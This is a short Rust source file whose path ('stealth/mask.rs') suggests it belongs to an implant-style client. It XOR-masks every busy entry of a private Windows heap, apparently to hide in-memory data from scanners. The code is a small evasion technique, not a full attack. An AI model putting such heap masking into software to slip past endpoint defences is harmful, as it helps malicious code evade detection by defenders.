// Client/core/src/stealth/mask.rs
// Memory & Heap Obfuscation (Masking)

use winapi::um::minwinbase::{PROCESS_HEAP_ENTRY, PROCESS_HEAP_ENTRY_BUSY};
use winapi::um::winnt::HANDLE;

/// XOR-Masks entries in a private heap.
pub unsafe fn mask_heap(h_heap: HANDLE, mask: u8) {
    use winapi::um::heapapi::HeapWalk;
    let mut entry: PROCESS_HEAP_ENTRY = std::mem::zeroed();
    while HeapWalk(h_heap, &mut entry) != 0 {
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0 {
            let data = std::slice::from_raw_parts_mut(entry.lpData as *mut u8, entry.cbData as usize);
            for b in data { *b ^= mask; }
        }
    }
}
